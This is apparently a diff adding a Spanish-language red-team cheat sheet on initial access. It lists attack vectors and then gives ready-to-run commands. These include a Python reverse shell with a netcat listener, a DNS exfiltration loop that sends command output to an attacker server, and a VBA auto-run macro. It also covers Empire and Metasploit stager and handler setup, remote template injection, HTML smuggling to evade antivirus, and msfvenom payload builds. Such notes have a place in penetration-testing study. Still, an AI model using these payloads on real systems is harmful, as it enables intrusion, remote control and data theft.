@@ -1,0 +1,120 @@
+===========================================================
+  T2 - 3. VECTORES DE ACCESO
+===========================================================
+Principales:
+  - Perimetro (RCE, SQLi, File Upload, XXE, deserializacion)
+  - Brute force VPN/Citrix/OWA contra empleados
+  - XSS (robo sesiones)
+  - Malware (macros, HTA, exploits)
+  - Wi-Fi
+  - Fisico (implante hardware)
+
+===========================================================
+  REVERSE SHELLS
+===========================================================
+
+--- PYTHON (Linux) ---
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IP-ATACANTE]",[PUERTO]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+--- UPGRADE A TTY ---
+python -c 'import pty; pty.spawn("/bin/bash")'
+# Luego:
+#   Ctrl+Z
+#   stty raw -echo; fg
+#   export TERM=xterm
+
+--- LISTENER ---
+nc -lvnp [PUERTO]
+rlwrap nc -lvnp [PUERTO]      # historial de comandos
+
+Cheatsheet completa:
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+===========================================================
+  EXFILTRACION DNS (cuando no hay salida directa)
+===========================================================
+[COMANDO] | xxd -ps -c 200 | tr -d '\n' > out.txt
+i=$(wc -c out.txt | cut -d " " -f1)
+for ((j=0;$i>=0;j++)); do
+  x=$(tail -c $i out.txt)
+  y=$(echo $x | head -c 60)
+  dig @[IP-VPS] -p 5053 +short -x $y.[DOMINIO]
+  i=$(expr $i - 60)
+done
+
+# Servidor DNS receptor:
+# https://gist.github.com/andreif/6069838
+
+===========================================================
+  MACROS VBA
+===========================================================
+Sub AutoOpen()
+Dim Shell As Object
+Set Shell = CreateObject("wscript.shell")
+Shell.Run "[COMANDO]"
+End Sub
+
+# IMPORTANTE: usar extension .doc (no .docx ni .docm)
+
+===========================================================
+  EMPIRE FRAMEWORK
+===========================================================
+
+--- ARRANCAR ---
+sudo powershell-empire server
+sudo powershell-empire client
+
+--- LISTENER HTTP ---
+Empire> uselistener http
+Empire> set Port [PUERTO]
+Empire> execute
+
+--- STAGER MACRO ---
+Empire> usestager multi_macros
+Empire> set Listener http
+Empire> execute
+
+===========================================================
+  REMOTE TEMPLATE INJECTION
+===========================================================
+python remoteinjector.py -w [URL-DOTM-MALICIOSO] [DOC-LIMPIO.docx]
+
+# El docx descarga la plantilla maliciosa al abrirse
+
+===========================================================
+  HTML SMUGGLING
+===========================================================
+- JS reconstruye el binario en el navegador
+- El gateway no ve el archivo (no hay descarga directa)
+- Usar para evadir proxies/AV de perimetro
+
+===========================================================
+  GENERACION DE PAYLOADS
+===========================================================
+
+--- MSFVENOM (basicos) ---
+# Reverse shell Windows EXE
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=[IP-ATACANTE] LPORT=[PUERTO] -f exe > shell.exe
+
+# DLL
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=[IP-ATACANTE] LPORT=[PUERTO] -f dll > shell.dll
+
+# MSI (para AlwaysInstallElevated)
+msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=[IP-ATACANTE] LPORT=[PUERTO] -f msi > payload.msi
+
+# HTA
+msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=[IP-ATACANTE] LPORT=[PUERTO] -f hta-psh > shell.hta
+
+===========================================================
+  HANDLER METASPLOIT
+===========================================================
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST [IP-ATACANTE]
+set LPORT [PUERTO]
+set ExitOnSession false
+exploit -j
